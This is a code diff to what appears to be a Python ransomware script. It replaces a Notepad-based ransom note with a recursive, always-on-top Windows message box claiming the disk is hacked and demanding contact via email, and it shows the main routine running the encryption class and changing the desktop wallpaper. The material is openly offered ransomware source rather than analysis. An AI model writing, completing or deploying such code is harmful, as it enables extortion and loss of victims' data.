@@ -19,27 +19,27 @@ import subprocess
 # Press Double ⇧ to search everywhere for classes, files, tool windows, actions, and settings.
 
 
-def note():
-    date = datetime.date.today().strftime("%d-%B-%Y")
-    with open('Hacker_note.txt', 'w') as f:
-        f.write(
-            "The disk of your computer has been hacked the day: {0:s}\nIn order to retrieve your data send a email to hacked@email.com".format(
-                date))
+#def note():
+#    date = datetime.date.today().strftime("%d-%B-%Y")
+#    with open('Hacker_note.txt', 'w') as f:
+#        f.write(
+#            "The disk of your computer has been hacked the day: {0:s}\nIn order to retrieve your data send a email to hacked@email.com".format(
+#                date))
 
 
-def show_note():
-    process = subprocess.Popen(['notepad.exe', 'Hacker_note.txt'])
-    count = 0
-    while count < 5:
-        time.sleep(0.1)
-        window = win32gui.GetWindowText(win32gui.GetForegroundWindow())
-        if not window == 'Hacker_note - Notepad':
-            time.sleep(0.1)
-            process.kill()
-            time.sleep(0.1)
-            process = subprocess.Popen(['notepad.exe', 'Hacker_note.txt'])
-        time.sleep(10)
-        count += 1
+#def show_note():
+#    process = subprocess.Popen(['notepad.exe', 'Hacker_note.txt'])
+#    count = 0
+#    while count < 5:
+#        time.sleep(0.1)
+#        window = win32gui.GetWindowText(win32gui.GetForegroundWindow())
+#        if not window == 'Hacker_note - Notepad':
+#            time.sleep(0.1)
+#            process.kill()
+#            time.sleep(0.1)
+#            process = subprocess.Popen(['notepad.exe', 'Hacker_note.txt'])
+#        time.sleep(10)
+#        count += 1
 
 
 class Ransomware:
@@ -120,6 +120,13 @@ class Ransomware:
         ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESWALLPAPER, 0, path, 0)
 
 
+def show_message_box():
+    date = datetime.date.today().strftime("%d-%B-%Y")
+    result = ctypes.windll.user32.MessageBoxW(0, "The disk of your computer has been hacked the day: {0:s}\nIn order to retrieve your data send a email to hacked@email.com".format(date), "Congrats", 0x40000)
+    if result:
+        show_message_box()
+
+
 # Press the green button in the gutter to run the script.
 if __name__ == '__main__':
     public = False
@@ -135,7 +142,6 @@ if __name__ == '__main__':
         ransomware = Ransomware()
         ransomware.run()
         ransomware.photo_background()
-        note()
-        show_note()
+        show_message_box()
 
 # See PyCharm help at https://www.jetbrains.com/help/pycharm/
